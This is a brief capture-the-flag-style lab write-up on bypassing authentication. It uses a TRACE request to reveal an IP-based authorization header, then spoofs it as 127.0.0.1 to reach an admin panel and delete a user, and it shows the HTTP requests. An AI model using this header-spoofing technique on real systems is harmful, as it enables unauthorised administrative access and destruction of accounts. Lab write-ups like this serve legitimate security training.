

# Lab: Authentication bypass via information disclosure

Should repeat one of the login packets but instead of GET use TRACE to get the http reponse headers used in autentication. We then get:

```
X-Custom-IP-Authorization: 84.109.20.63
```
This is our extenal IP - we need to verify ourselves as Admmins, so lets change this to localhost

Now we can use this autherization header to permit to enter the admin panel:
```
X-Custom-IP-Authorization: 127.0.0.1
```

Enter the admin with this login request:
```
POST /login HTTP/1.1
...
X-Custom-IP-Authorization: 127.0.0.1

csrf=f9rivO9QlHCwOVBBVmjTuQrJSYFadDXO&username=admin&password=1234
```

Now we get the admin panel in order to delete carlos with this request:
```
GET /admin/delete?username=carlos HTTP/1.1
...
X-Custom-IP-Authorization: 127.0.0.1
```
